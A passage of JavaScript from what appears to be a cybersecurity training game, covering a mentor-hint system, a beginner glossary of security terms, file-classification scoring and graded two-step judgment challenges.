  if (!SIM.sparring) SIM.sparring = freshSparringState();
  const have = SIM.sparring.trails || (SIM.sparring.trails = []);
  armed.forEach(t => {
    if (!t || have.some(x => x.id === t.id)) return;   // idempotent
    have.push({
      id: t.id, label: t.label, target: t.target || null,
      action: t.action, matchOn: t.matchOn, armedAt: Date.now(), consumedAt: null,
    });
    sparringLog('trail-arm', { id: t.id });
  });
}
/* Trails surface only when their later pattern is visible AND their target is an
 * already-surfaced finding \u2014 they can never point at anything unearned. */
function mentorTrailCtx() {
  const visiblePatternKeys = new Set(visibleDiscoveryChallenges().filter(challengeValid).map(c => c.id));
  return { visiblePatternKeys, accessibleTargets: SIM.evidence };
}
function mentorTrailHtml() {
  if (!sarahOn('mentorTrails')) return '';
  const trails = (SIM.sparring && SIM.sparring.trails) || [];
  if (!trails.length) return '';
  const ctx = mentorTrailCtx();
  const live = trails.filter(t => trailMatches(t, ctx));
  if (!live.length) return '';
  const items = live.map(t => {
    const done = !!t.consumedAt;
    const cta = t.action === 'openScopedRecap' ? 'Open a quick scope recap' : 'Show me that finding';
    return `
      <div class="sim-trail-item${done ? ' sim-trail-item--done' : ''}">
        <p class="sim-trail-line"><span class="sim-trail-from">Sarah Reyes</span>${mapEsc(t.label)}</p>
        <button type="button" class="sim-trail-act" data-trail-run="${mapEsc(t.id)}"${done ? ' aria-pressed="true"' : ''}>${done ? 'Reviewed \u2713' : cta}</button>
      </div>`;
  }).join('');
  return `
    <div class="sim-notebook-section sim-trail">
      <div class="sim-notebook-head sim-notebook-head--trail">WHAT I\u2019D CHECK NEXT</div>
      ${items}
    </div>`;
}
/* Run a trail action \u2014 read-only navigation. focusEvidence scrolls/flashes the
 * already-surfaced target finding; openScopedRecap opens a display-only scope
 * recap WITHOUT staking confidence (never touches confSpend). */
function runMentorTrail(id) {
  if (!sarahOn('mentorTrails')) return;
  const trails = (SIM.sparring && SIM.sparring.trails) || [];
  const t = trails.find(x => x.id === id);
  if (!t || !trailActionValid(t.action)) return;
  t.consumedAt = Date.now();
  sparringLog('trail-run', { id, action: t.action });
  if (t.action === 'openScopedRecap') {
    const P = SIM.powers;
    if (P) P.active['betSnapshot'] = { left: SNAPSHOT_WINDOW, counts: scopeCounts(), source: 'trail' };
    renderEvidencePanel();
    return;
  }
  renderEvidencePanel();
  if (t.target && /^[\w-]+$/.test(t.target)) {
    const host = document.getElementById('simEvidence');
    const body = host && host.querySelector('.sim-evidence-body');
    const el = body && body.querySelector(`.sim-ev-item[data-ev-id="${t.target}"]`);
    if (body && el) {
      simScrollBodyTo(body, el);
      try { void el.offsetWidth; el.classList.add('sim-ev-item--flash'); } catch (_) { /* flash is cosmetic */ }
    }
  }
}

/* ---- (5) END-OF-MISSION PERFORMANCE MIRROR + PERK ------------------- */
/* Posture signals ONLY \u2014 never correctness, never a score. Every input reflects
 * HOW the analyst engaged, not whether a keyed answer was right: did they
 * calibrate, how many calls did they commit to the record, how wide did they pull
 * evidence, did they flag unknowns, did they stake a falsifiable bet. */
function performanceMirrorSignals() {
  const cal = SIM.sparring && SIM.sparring.calibration;
  const unknownsDeclared = (SIM.markup || []).filter(m => m && m.tag === 'unknown').length;
  // Decisiveness posture: how many findings the player committed to the record.
  // Independent of whether the call was correct (NO scoring/correctness helper).
  const committedCalls = (SIM.committedFindings || []).length;
  return {
    calibrationUsed: !!(cal && cal.committed),
    committedCalls,
    breadth: evidenceBreadth(),
    unknownsDeclared,
    betStrong: !!(SIM.analystBet && SIM.analystBet.strong),
  };
}
/* Sarah's end-of-mission read: exactly one reinforced strength + one nudge, with
 * an optional session-scoped carry-over perk. Computed once and cached for
 * display; the perk lives at module scope (NON-persisted) so it survives into the
 * next openCareerMission and is consumed there. Persists nothing. */
function performanceMirrorHtml() {
  if (!sarahOn('performanceMirror')) return '';
  if (!SIM.sparring) SIM.sparring = freshSparringState();
  let recap = SIM.sparring.recap;
  if (!recap) {
    recap = selectRecap(performanceMirrorSignals());
    SIM.sparring.recap = recap;
    if (recap.perk) {
      try {
        SARAH_SESSION_PERK = { id: recap.perk.id, label: recap.perk.label, note: recap.perk.note, fromMission: SIM.missionId };
      } catch (_) { /* perk arming is best-effort */ }
      sparringLog('mirror-perk', { id: recap.perk.id });
    }
    sparringLog('mirror', { strength: recap.strengthId, nudge: recap.nudgeId });
  }
  const perk = recap.perk
    ? `<div class="sim-mirror-perk"><span class="sim-mirror-perk-lab">Carry-over \u2014 ${mapEsc(recap.perk.label)}</span>${mapEsc(recap.perk.note)}</div>` : '';
  return `
    <div class="sim-mirror">
      <div class="sim-mirror-head">SARAH\u2019S READ ON YOU</div>
      <div class="sim-mirror-row sim-mirror-row--strength"><span class="sim-mirror-tag">What worked</span><p class="sim-mirror-line">${mapEsc(recap.strength)}</p></div>
      <div class="sim-mirror-row sim-mirror-row--nudge"><span class="sim-mirror-tag">For next time</span><p class="sim-mirror-line">${mapEsc(recap.nudge)}</p></div>
      ${perk}
    </div>`;
}
/* The carry-over banner from the PREVIOUS mission's debrief perk (display-only).
 * SIM.sparring.carry is set in openCareerMission from the session perk var. */
function sparringCarryHtml() {
  if (!sarahOn('performanceMirror')) return '';
  const carry = SIM.sparring && SIM.sparring.carry;
  if (!carry) return '';
  return `
    <div class="sim-notebook-section sim-carry">
      <div class="sim-notebook-head sim-notebook-head--carry">FROM YOUR LAST DEBRIEF</div>
      <p class="sim-carry-line"><span class="sim-carry-lab">${mapEsc(carry.label)}</span>${mapEsc(carry.note)}</p>
    </div>`;
}
/* --- end #124 sarah-sparring layer --- */

/* ================================================================== *
 * INVESTIGATION ENGINE (P2) — terminal (ls/cat/less), evidence,
 * file classification. Reward is investigation QUALITY (weighted
 * evidence surfaced + files classified correctly), never command count.
 * All content is data-driven.
 * ================================================================== */
const CLASSIFICATIONS = [
  { id: 'public',       label: 'Public' },
  { id: 'internal',     label: 'Internal' },
  { id: 'confidential', label: 'Confidential' },
  { id: 'restricted',   label: 'Restricted' },
];
function classLabel(id) { const c = CLASSIFICATIONS.find(x => x.id === id); return c ? c.label : id; }

/* ================================================================== *
 * PROGRESSIVE EVIDENCE LAYERS — beginner-first presentation
 * ------------------------------------------------------------------ *
 * The investigation engine is unchanged; only HOW evidence reads changes.
 * Every evidence item may carry a `layers` block with three presentation
 * depths so a true beginner reasons about WHAT looks off and WHY before
 * meeting the professional terminology:
 *   layers.beginner = { summary, why, prompt }  (plain language, Layer 1)
 *   layers.analyst  = "semi-technical observation" (Layer 2)
 *   layers.technical= "full professional detail"   (Layer 3)
 *   layers.terms    = ['pii', ...]  glossary keys surfaced with L2/L3
 * The legacy `label` stays as a fallback so missions without layers still
 * render. Shape is generic: future missions / role tiers supply their own.
 * ================================================================== */
const JUDGMENTS = ['Benign', 'Suspicious', 'Malicious'];

/* Reusable glossary. Classification ids (public/internal/confidential/
 * restricted) double as glossary keys so the classification legend reuses
 * the same definitions. Add terms here; reference by key from a dataset. */
const SIM_GLOSSARY = {
  public: {
    term: 'Public',
    definition: 'Information already cleared for anyone to see, such as published marketing material.',
    why: 'Safe to share outside the company — there is no harm if it spreads.',
  },
  internal: {
    term: 'Internal',
    definition: 'Information meant for people inside the company — not secret, but not for outsiders either.',
    why: 'Sending it outside is usually unnecessary and can reveal how the company works.',
  },
  confidential: {
    term: 'Confidential',
    definition: 'Sensitive business information limited to specific people, like negotiated pricing or unannounced plans.',
    why: 'Exposure can damage deals, competitiveness, or partner trust.',
  },
  restricted: {
    term: 'Restricted',
    definition: 'The most tightly controlled information, like employee personal data or regulated payment records.',
    why: 'A leak can trigger legal penalties and real harm — this should never leave the company.',
  },
  pii: {
    term: 'PII',
    definition: 'Personally identifiable information — details that identify a specific person, like names, salaries, or addresses.',
    why: 'If it leaks, real people can be harmed and the company can face legal penalties.',
  },
  pci: {
    term: 'PCI scope',
    definition: 'Payment-card data covered by the PCI security standard — card numbers, payment details, and the systems that touch them.',
    why: 'This data is regulated; mishandling it can mean heavy fines and customer harm.',
  },
  materialNonPublic: {
    term: 'material non-public information',
    definition: 'Significant business information that has not been announced publicly, such as a planned acquisition.',
    why: 'Sharing or acting on it early can break the law and tip off competitors.',
  },

  /* ---- Mission 2 — Network Assets ---- */
  device: {
    term: 'Device',
    definition: 'Any piece of hardware connected to the network — a laptop, server, printer, or phone.',
    why: 'Every device on the network is a way in. One you do not recognize is one you cannot trust.',
  },
  network: {
    term: 'Network',
    definition: 'The system that links devices together so they can share data and talk to each other.',
    why: 'Anything on the same network can often reach the company'+"'"+'s internal systems and files.',
  },
  ipAddress: {
    term: 'IP address',
    definition: 'A numbered address (like 192.168.1.57) that identifies one device on the network.',
    why: 'It tells you which exact device is doing something — your first handle on who is who.',
  },
  service: {
    term: 'Service',
    definition: 'A program running on a device that listens for requests, such as a website, file share, or remote login.',
    why: 'Open services are doors. The more a device exposes, the more an attacker can try to push on.',
  },
  subnet: {
    term: 'Subnet',
    definition: 'A slice of the network grouped under a shared address range, like 192.168.1.0/24.',
    why: 'Devices on the same subnet can usually reach each other directly — useful, and risky.',
  },
  portScan: {
    term: 'Port scan',
    definition: 'Checking a device to see which services (ports) it has open and listening.',
    why: 'It reveals what a device exposes — the same first step an attacker takes.',
  },

  /* ---- Mission 3 — Authentication Activity ---- */
  authentication: {
    term: 'Authentication',
    definition: 'Proving who you are before being let in — typically a username plus a password.',
    why: 'If someone defeats it, they become that user, with all of their access.',
  },
  mfa: {
    term: 'MFA',
    definition: 'Multi-factor authentication — a second proof of identity beyond the password, like a phone code.',
    why: 'It stops most stolen-password attacks. Turning it off is a classic move once an account is taken over.',
  },
  bruteForce: {
    term: 'Brute force',
    definition: 'Guessing a password over and over, often automatically, until one attempt works.',
    why: 'A burst of failed logins followed by a success is a textbook sign of it.',
  },
  credentialCompromise: {
    term: 'Account compromise',
    definition: 'When someone other than the real owner gains control of an account.',
    why: 'The attacker now acts as a trusted insider — much harder to spot than an outsider.',
  },
  impossibleTravel: {
    term: 'Impossible travel',
    definition: 'Two logins from places too far apart to reach in the time between them — so they cannot be the same person.',
    why: 'It is strong evidence that someone else is using the account from another location.',
  },

  /* ---- Mission 4 — Data Exfiltration ---- */
  dataExfiltration: {
    term: 'Data exfiltration',
    definition: 'Copying data out of the company to somewhere an attacker controls — the actual theft of information.',
    why: 'Once data leaves the network you cannot get it back; this is the moment a risk becomes a real breach.',
  },
  dlp: {
    term: 'DLP',
    definition: 'Data-loss prevention — monitoring that watches for sensitive data leaving the network and raises an alert.',
    why: 'A DLP alert on a large outbound transfer is often the first concrete sign that data is being stolen.',
  },
  archive: {
    term: 'Archive',
    definition: 'A single bundled, often compressed, file (like a .zip) that packs many files together.',
    why: 'Attackers archive data first so they can move a whole database out in one quiet upload.',
  },
  incidentResponse: {
    term: 'Incident response',
    definition: 'The organized process of containing, investigating, and recovering from a confirmed security incident.',
    why: 'A confirmed breach needs a coordinated response — not just one analyst acting alone.',
  },
  rootCause: {
    term: 'Root cause',
    definition: 'The underlying reason an incident happened — the entry point or failure that everything else followed from.',
    why: 'Fixing the root cause is what stops the same breach happening again; treating symptoms does not.',
  },
  breachNotification: {
    term: 'Breach notification',
    definition: 'A legal duty to tell regulators and affected people when their personal data has been exposed.',
    why: 'Missing or delaying required notifications turns a breach into fines and lasting loss of trust.',
  },
};
function glossaryEntry(key) { return SIM_GLOSSARY[key] || null; }

/* Normalize an evidence item into the three layers, with the legacy `label`
 * as a fallback so un-layered evidence (or future missions) still render. */
function evLayers(e) {
  const L = (e && e.layers) || {};
  const b = L.beginner || {};
  return {
    beginner: {
      summary: b.summary || (e && e.label) || '',
      why: b.why || '',
      prompt: b.prompt || '',
    },
    analyst: L.analyst || (e && e.label) || '',
    technical: L.technical || (e && e.label) || '',
    terms: Array.isArray(L.terms) ? L.terms : [],
  };
}

/* The active evidence presentation mode (beginner default). */
function evidenceView() { return CAREER.evidenceView === 'analyst' ? 'analyst' : 'beginner'; }
function setEvidenceView(mode) {
  const next = mode === 'analyst' ? 'analyst' : 'beginner';
  if (CAREER.evidenceView === next) return;
  CAREER.evidenceView = next;
  saveCareerState();
  renderEvidencePanel();
}

/* A glossary term rendered as an inline, hover/focus/tap-accessible chip.
 * CSS shows the tooltip on :hover / :focus-within; tap toggles --open via the
 * delegated handler. Definition + "why it matters" come straight from the
 * glossary so terminology stays consistent everywhere it appears. */
function glossaryTermHtml(key) {
  const g = glossaryEntry(key);
  if (!g) return '';
  return `<span class="sim-term-wrap">` +
    `<button type="button" class="sim-term" data-term="${key}" aria-expanded="false">${g.term}</button>` +
    `<span class="sim-tip" role="tooltip">` +
      `<span class="sim-tip-term">${g.term}</span>` +
      `<span class="sim-tip-def">${g.definition}</span>` +
      `<span class="sim-tip-why"><span class="sim-tip-why-label">Why it matters:</span> ${g.why}</span>` +
    `</span></span>`;
}
function evTermsHtml(terms) {
  if (!terms || !terms.length) return '';
  const chips = terms.map(glossaryTermHtml).filter(Boolean).join(' ');
  if (!chips) return '';
  return `<div class="sim-ev-terms"><span class="sim-ev-terms-label">Key terms:</span> ${chips}</div>`;
}

/* Carry-forward flags this mission can raise (persisted into CAREER.missionFlags
 * for later missions to read). Human labels for the debrief. */
const CANON_FLAGS = ['contractorAccessDiscovered', 'sensitiveDataExposed', 'legalReviewTriggered'];
const FLAG_LABELS = {
  contractorAccessDiscovered: 'Contractor access flagged for follow-up',
  sensitiveDataExposed: 'Sensitive-data exposure on record',
  legalReviewTriggered: 'Legal review opened',
};

function simFiles() { return (SIM.def && SIM.def.files) || []; }
function simFileByName(name) { return simFiles().find(f => f.name === name) || null; }
function simEvidenceDefs() { return (SIM.def && SIM.def.evidence) || []; }
function evidenceById(id) { return simEvidenceDefs().find(e => e.id === id) || null; }
function allFilesRead() { return simFiles().length > 0 && simFiles().every(f => SIM.read.has(f.name)); }
/* File-model completion signal that is agnostic to HOW a finding surfaced. Every
 * file-borne evidence id is surfaced once it has been deep-read (cat) OR triaged
 * (grep). Lets the grep-triage flow reach the same completion + thoroughness bonus
 * as opening all seven files, without a new graded path. */
function allFileEvidenceSurfaced() {
  const ids = simFiles().flatMap(f => f.evidenceIds || []);
  return ids.length > 0 && ids.every(id => SIM.evidence.has(id));
}

/* A file is "discovered" — and therefore ready to classify — once it has been
 * deep-read (cat) OR had its evidence surfaced by grep triage. The classify UI
 * and next-step guidance key on this so the grep flow doesn't force a cat on
 * every file. Scoring (classificationQuality) still measures ALL files, so a
 * skipped/undiscovered file still costs accuracy if left unclassified. */
function fileEvidenceSurfaced(f) {
  const ids = (f && f.evidenceIds) || [];
  return ids.length > 0 && ids.some(id => SIM.evidence.has(id));
}
function fileClassificationVisible(f) {
  return !!f && (SIM.read.has(f.name) || fileEvidenceSurfaced(f));
}

/* Fraction (0..1) of total evidence weight surfaced — drives the recommendation
 * engine so thorough investigation, not command volume, earns better outcomes. */
function evidenceQuality() {
  const total = simEvidenceDefs().reduce((s, e) => s + (e.qualityWeight || 0), 0);
  if (total <= 0) return 0;
  let got = 0;
  SIM.evidence.forEach(id => { const e = evidenceById(id); if (e) got += (e.qualityWeight || 0); });
  return Math.min(1, got / total);
}

/* Fraction (0..1) of files classified CORRECTLY against ground truth. This feeds
 * the recommendation engine alongside evidence quality, so misfiling sensitive
 * data (or leaving files unclassified) weakens the case — classification is a
 * real gameplay input, never cosmetic. Measured over EVERY file (the objective
 * is to classify each one), so skipping files costs accuracy. */
function classificationQuality() {
  const files = simFiles();
  if (!files.length) return 0;
  let correct = 0;
  files.forEach(f => { if (SIM.classified[f.name] === f.trueClassification) correct++; });
  return correct / files.length;
}

/* ------------------------------------------------------------------ *
 * GRADED DISCOVERY CHALLENGES (Investigation-First pilot — Mission 1)
 * ------------------------------------------------------------------ *
 * A mission may attach `discoveryChallenges`: per-finding multiple-choice
 * judgment prompts, each tied to an evidence id and surfaced once that evidence
 * is. They are GRADED — correctness feeds investigationConfidence() (live) and
 * computeRecommendationOutcome() (final). Missions that define no challenges are
 * completely unaffected: every helper returns null/[] so the confidence + scoring
 * paths fall back to their original behaviour (M2–M4 are untouched). */
function simDiscoveryChallenges() {
  return (SIM.def && Array.isArray(SIM.def.discoveryChallenges)) ? SIM.def.discoveryChallenges : [];
}
function discoveryChallengeById(id) {
  return simDiscoveryChallenges().find(c => c.id === id) || null;
}
/* Challenges whose triggering evidence has surfaced — the only ones the player
 * can answer (and the only ones shown). */
function visibleDiscoveryChallenges() {
  return simDiscoveryChallenges().filter(c => SIM.evidence.has(c.evidenceId));
}
/* ---- Two-step judgment helpers (observation → justification) -------------- *
 * A well-formed challenge carries an `observation` and a `justification` step,
 * each { prompt, correct, options:[{id,label,feedback}] }. Helpers tolerate the
 * old single-step shape and any malformed entry by treating it as not-valid
 * (it simply contributes nothing to grading and renders as '').               */
const JUDGMENT_STEPS = ['observation', 'justification'];

/* The config object for one step of a challenge, or null if missing/malformed. */
function challengeStep(ch, step) {
  return (ch && ch[step] && Array.isArray(ch[step].options)) ? ch[step] : null;
}
/* A challenge is gradable/renderable only if BOTH steps are well-formed. */
function challengeValid(ch) {
  return !!challengeStep(ch, 'observation') && !!challengeStep(ch, 'justification');
}
/* The recorded picks for a challenge ({} when nothing answered yet). */
function challengeAnswers(ch) {
  return (ch && SIM.discoveryJudgments[ch.id]) || {};
}
function stepAnswered(ch, step) {
  return !!challengeAnswers(ch)[step];
}
/* Both steps recorded = a complete reasoning entry. */
function challengeAnswered(ch) {
  return challengeValid(ch) && stepAnswered(ch, 'observation') && stepAnswered(ch, 'justification');
}
/* Fisher-Yates shuffle, in place; returns the same array. */
function shuffleInPlace(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}
/* A step's reply options in a STABLE shuffled display order. The correct reply is
 * authored first in the data, so it would always render as choice A; shuffling the
 * display order removes that tell. The order is generated once per challenge+step
 * and reused across the panel's frequent re-renders, so options never jump while
 * the player is reading. View-state only (SIM.optionOrder) — never persisted, and
 * it cannot affect grading, which keys on the option id, not the display slot. */
function stepOptionsOrdered(ch, step) {
  const cfg = challengeStep(ch, step);
  if (!cfg) return [];
  const ids = cfg.options.map(o => o.id);
  const store = SIM.optionOrder[ch.id] || (SIM.optionOrder[ch.id] = {});
  let order = store[step];
  const stale = !Array.isArray(order) || order.length !== ids.length || !order.every(id => ids.includes(id));
  if (stale) order = store[step] = shuffleInPlace(ids.slice());
  const byId = new Map(cfg.options.map(o => [o.id, o]));
  return order.map(id => byId.get(id)).filter(Boolean);
}
/* ------------------------------------------------------------------ *
 * DECISION DOCK predicates (presentation-only). The active two-step judgment
 * is relocated out of the right-side notebook into a prominent dock beneath the
 * terminal that hard-locks the command line until the player answers Sarah; the
 * notebook keeps only the LOGGED record. All gated on SIM.def.caseFileNotebook —
 * setDiscoveryJudgment stays the sole graded write; never branch on a mission id.
 * ------------------------------------------------------------------ */
/* Surfaced, valid challenges the player still owes Sarah an answer on. */
function pendingDiscoveryChallenges() {
  return visibleDiscoveryChallenges().filter(c => challengeValid(c) && !challengeAnswered(c));
}
/* Surfaced, valid challenges already fully answered — the notebook's record. */
function loggedDiscoveryChallenges() {
  return visibleDiscoveryChallenges().filter(c => challengeValid(c) && challengeAnswered(c));
}
/* The single decision the dock is currently asking for (oldest pending first). */
function activeDecisionChallenge() {
  return pendingDiscoveryChallenges()[0] || null;
}
/* The fresh graded call still awaiting its "review the file" acknowledgment, or
 * null. Only meaningful when reviewGateMode() is on AND the active call has not
 * yet been acknowledged. Presentation-only: it gates ONLY which card the dock
 * shows (review prompt vs question) — never grading, the lock target, or which
 * challenge counts as pending. */
function activeReviewChallenge() {
  if (!reviewGateMode()) return null;
  const ch = activeDecisionChallenge();
  if (!ch) return null;
  return SIM.reviewAck[ch.id] ? null : ch;
}
/* Answered findings the player has NOT yet logged — the dock's optional draft
 * queue (oldest first). Logging is presentation-only and NEVER locks the terminal
 * (so these are deliberately absent from caseFileDecisionPending); they only
 * surface in the dock once no graded call or reconsideration is pending. */
function draftableFindings() {
  if (!(SIM.def && SIM.def.caseFileNotebook)) return [];
  return visibleDiscoveryChallenges()
    .filter(c => challengeValid(c) && challengeAnswered(c) && findingDef(c) && !findingCommitted(c.id));
}
/* The single finding the dock invites the player to log (oldest un-logged). */
function activeDraftFinding() {
  return draftableFindings()[0] || null;
}
/* A case-file Sarah call is awaiting the player's answer. This blocks acting on
 * the mission regardless of stage (the only exception is 'report', once the
 * decision is finalized): during investigation it holds the terminal lock; at
 * the decision stage (e.g. after an early `decide`) it keeps the handling-action
 * guards live so a call can never be skipped. */
function caseFileDecisionPending() {
  if (!(SIM.def && SIM.def.caseFileNotebook)) return false;
  // A pending two-step call OR a pending reconsideration pivot both hold the line —
  // Sarah's "does this change your read?" beat can never be skipped by `decide`.
  return pendingDiscoveryChallenges().length > 0 || pendingReconsiderations().length > 0;
}
function decisionLocked() {
  if (SIM.stage === 'report') return false;   // mission finalized — never lock
  return caseFileDecisionPending();
}
/* Is the recorded pick for this step the correct one? */
function challengeStepCorrect(ch, step) {
  const cfg = challengeStep(ch, step);
  return !!cfg && challengeAnswers(ch)[step] === cfg.correct;
}
/* Both steps correct. */
function challengeFullyCorrect(ch) {
  return challengeValid(ch) && challengeStepCorrect(ch, 'observation') && challengeStepCorrect(ch, 'justification');
}
/* Status of an answered challenge: 'correct' | 'partial' | 'incorrect'. */
function challengeStatus(ch) {
  const o = challengeStepCorrect(ch, 'observation');
  const j = challengeStepCorrect(ch, 'justification');
  if (o && j) return 'correct';
  if (o || j) return 'partial';
  return 'incorrect';
}

/* Weighted half-credit correctness over a list of challenges. Each well-formed
 * challenge contributes its weight, split evenly across the two steps; only an
 * answered+correct step earns its half. null when there is nothing valid to
 * grade, so the meter/score fall back to evidence-only (M-with-no-challenges). */
function judgmentQualityOver(list) {
  const valid = list.filter(challengeValid);
  const total = valid.reduce((s, c) => s + (c.weight || 1), 0);
  if (total <= 0) return null;
  let got = 0;
  valid.forEach(c => {
    const half = (c.weight || 1) / 2;
    if (challengeStepCorrect(c, 'observation')) got += half;
    if (challengeStepCorrect(c, 'justification')) got += half;
  });
  return Math.min(1, got / total);
}
/* Live meter — only the challenges whose finding has surfaced. */
function judgmentQualityVisible() {
  if (!simDiscoveryChallenges().some(challengeValid)) return null;
  return judgmentQualityOver(visibleDiscoveryChallenges());
}
/* Final score — all defined challenges, so unanswered/wrong steps cost points. */
function judgmentQualityAll() {
  if (!simDiscoveryChallenges().some(challengeValid)) return null;
  return judgmentQualityOver(simDiscoveryChallenges());
}
/* Record one step's answer — the SOLE writer of SIM.discoveryJudgments. Honest
 * grading: the finding must have surfaced, the step must be valid, the
 * justification step opens only after the observation is recorded, each step
 * locks after its first pick, and the option must be valid for that step. */
function setDiscoveryJudgment(challengeId, step, optionId) {
  const ch = discoveryChallengeById(challengeId);
  if (!ch || !challengeValid(ch)) return;
  if (!SIM.evidence.has(ch.evidenceId)) return;                // finding must have surfaced
  if (step !== 'observation' && step !== 'justification') return;
  const cfg = challengeStep(ch, step);
  if (!cfg) return;
  if (step === 'justification' && !stepAnswered(ch, 'observation')) return; // observation first
  if (stepAnswered(ch, step)) return;                          // locked after first answer
  if (!cfg.options.some(o => o.id === optionId)) return;       // valid option only — validate BEFORE allocating
  const ans = SIM.discoveryJudgments[challengeId] || (SIM.discoveryJudgments[challengeId] = {});
  ans[step] = optionId;
  // #124 arm any mentor trail whose thread was just committed (gated, best-effort).
  try { sparringArmTrails(challengeId); } catch (_) { /* mentor trails are best-effort */ }
  powersTick();              // earn/expire/recover analyst tools (transient, no render)
  renderEvidencePanel();
  focusNextComms(challengeId, step); // keep keyboard focus inside the comms flow (a11y)
}

/* ================================================================== *
 * RECONSIDERATION / PIVOT BEAT (Option B) — presentation-only, NON-GRADED.
 * ------------------------------------------------------------------ *
 * When a LATER finding surfaces that should reframe an EARLIER already-logged
 * call, Sarah asks the analyst to REVISE or consciously HOLD their read. This is
 * a deliberate reasoning beat, not a re-grade: setDiscoveryJudgment stays the SOLE
 * graded write, the original two-step call stays immutable, and this layer only
 * records reflective posture on SIM.reconsiderations (transient, never persisted,
 * never touches confidence / grading helpers / saveProgress). Authored per-mission
 * in def.reconsiderations[] and gated on its presence — never on a mission id.
 * Copy is neutral ("does this change your read?") so it never leaks a verdict.
 * ================================================================== */
function simReconsiderations() {
  return (SIM.def && Array.isArray(SIM.def.reconsiderations)) ? SIM.def.reconsiderations : [];
}
function reconsiderationById(id) {
  return simReconsiderations().find(r => r && r.id === id) || null;
}
/* Well-formed: has a trigger evidence, a resolvable earlier target challenge, and
 * at least one option. */
function reconsiderValid(rc) {
  return !!(rc && rc.id && rc.when && rc.target
    && Array.isArray(rc.options) && rc.options.length
    && discoveryChallengeById(rc.target));
}
function reconsiderAnswer(rc) {
  return (rc && SIM.reconsiderations[rc.id]) || null;
}
function reconsiderAnswered(rc) {
  return !!reconsiderAnswer(rc);
}
/* "Live" only once the trigger evidence has surfaced AND the earlier call it
 * reframes has actually been answered — there is nothing to reconsider otherwise. */
function reconsiderLive(rc) {
  if (!reconsiderValid(rc)) return false;
  if (!SIM.evidence.has(rc.when)) return false;
  return challengeAnswered(discoveryChallengeById(rc.target));
}
function visibleReconsiderations() {
  return simReconsiderations().filter(reconsiderLive);
}
function pendingReconsiderations() {
  return visibleReconsiderations().filter(rc => !reconsiderAnswered(rc));
}
/* The single reconsideration the dock is currently asking for (oldest pending). */
function activeReconsideration() {
  return pendingReconsiderations()[0] || null;
}
/* Live reconsiderations that reframe a given challenge — drives the notebook badge. */
function reconsiderationsForTarget(challengeId) {
  return visibleReconsiderations().filter(rc => rc.target === challengeId);
}
/* The SOLE writer of SIM.reconsiderations — NON-GRADED. Records the analyst's
 * revise/hold posture; never touches SIM.discoveryJudgments, the grading helpers,
 * confidence, or saveProgress. One-shot per reconsideration. */
function setReconsideration(rcId, optionId) {
  const rc = reconsiderationById(rcId);
  if (!reconsiderValid(rc)) return;
  if (!reconsiderLive(rc)) return;                 // trigger surfaced + target answered
  if (reconsiderAnswered(rc)) return;              // immutable after first pick
  if (!rc.options.some(o => o.id === optionId)) return;
  SIM.reconsiderations[rcId] = optionId;
  renderEvidencePanel();
  focusNextComms();                                // keep keyboard focus in the flow
}

/* After a comms reply is recorded and the panel re-renders, move keyboard focus
 * to the next thing the player says: the justification reply for the same
 * finding, the first pending reply anywhere, else the comms section heading so
 * focus never falls back to <body>. Presentation / accessibility only. */
function focusNextComms(challengeId, step) {
  // Pending decisions now live in the dock; the notebook holds only the logged
  // record. Keep focus in the live flow: the dock first, then — when nothing is
  // pending and the terminal has unlocked — back on the command line, else the
  // read-only notebook heading so focus never falls back to <body>.
  const dock = document.getElementById('simDecisionDock');
  let target = null;
  if (dock && !dock.hidden) {
    if (step === 'observation') {
      target = dock.querySelector(`.sim-comms-reply[data-challenge="${challengeId}"][data-step="justification"]`);
    }
    if (!target) target = dock.querySelector('.sim-comms-reply');
  }
  if (!target && !decisionLocked()) {
    const input = document.getElementById('simTermInput');
    if (input && !input.disabled && typeof input.focus === 'function') {
      try { input.focus({ preventScroll: true }); } catch (_e) { input.focus(); }
      return;
    }
  }
  if (!target) {
    const host = document.getElementById('simEvidence');
    if (host) target = host.querySelector('.sim-notebook-head--comms');
  }
  if (target && typeof target.focus === 'function') {
    try { target.focus({ preventScroll: true }); } catch (_e) { target.focus(); }
  }
}

/* ---- Decision Dock render + terminal lock (presentation-only) ----------- *
 * The dock relocates the ACTIVE decision beneath the terminal. It reuses the
 * exact two-step comms card the notebook used, so the depth (Sarah's voice, the
 * observation -> justification flow, no right/wrong wording) is unchanged — only
 * its location and the terminal lock are new. No persistence, no scoring. */

/* The review-gate card — a small, calm beat shown before a fresh graded call when
 * the mission opts in (reviewBeforeCall). It deliberately reveals NOTHING about the
 * question (no options, no correctness signal): just a nudge to study the file the
 * player just printed, plus one CONTINUE button that surfaces the real call.
 * Presentation-only — clicking it flips a transient flag, nothing more. */
function reviewGateHtml(ch) {
  return `
    <div class="sim-dock-head sim-dock-head--review">
      <span class="sim-dock-title"><span class="sim-dock-pulse" aria-hidden="true"></span>New finding logged</span>
    </div>
    <div class="sim-dock-body">
      <p class="sim-dock-review-lead">Take a moment to read what just came up in the terminal above. When you've looked it over, Sarah will ask for your read.</p>
      <button type="button" class="sim-dock-review-go" data-review-ack="${ch.id}">I've reviewed it — continue <span class="sim-dock-review-arrow" aria-hidden="true">\u25B8</span></button>
    </div>
    <p class="sim-dock-foot sim-dock-foot--review">No rush — the terminal waits here. Read it over, then continue when you're ready.</p>`;
}

/* The dock's content: the single active decision wrapped in dock chrome that
 * makes the stakes obvious. '' when nothing pends (caller hides the host). */
function decisionDockHtml() {
  // Highest priority (opt-in only): the "review the file first" beat. When this
  // mission sets reviewBeforeCall and a fresh call has surfaced but the player has
  // not yet acknowledged reviewing the file, show a compact CONTINUE prompt INSTEAD
  // of the question — so the file just printed stays visible. Once acknowledged,
  // we fall straight through to the same question card below.
  const rev = activeReviewChallenge();
  if (rev) return reviewGateHtml(rev);
  // Priority: a fresh two-step call is answered FIRST; only once none are pending
  // does a reconsideration of an earlier call surface. So a finding's own normal
  // call clears before Sarah asks whether it changes a prior read.
  const ch = activeDecisionChallenge();
  if (ch) {
    const more = pendingDiscoveryChallenges().length - 1;
    const queueHtml = more > 0
      ? `<span class="sim-dock-queue">${more} more call${more === 1 ? '' : 's'} after this</span>`
      : '';
    return `
    <div class="sim-dock-head">
      <span class="sim-dock-title"><span class="sim-dock-pulse" aria-hidden="true"></span>Sarah needs your call</span>
      ${queueHtml}
    </div>
    <div class="sim-dock-body">
      ${discoveryCardHtml(ch)}
    </div>
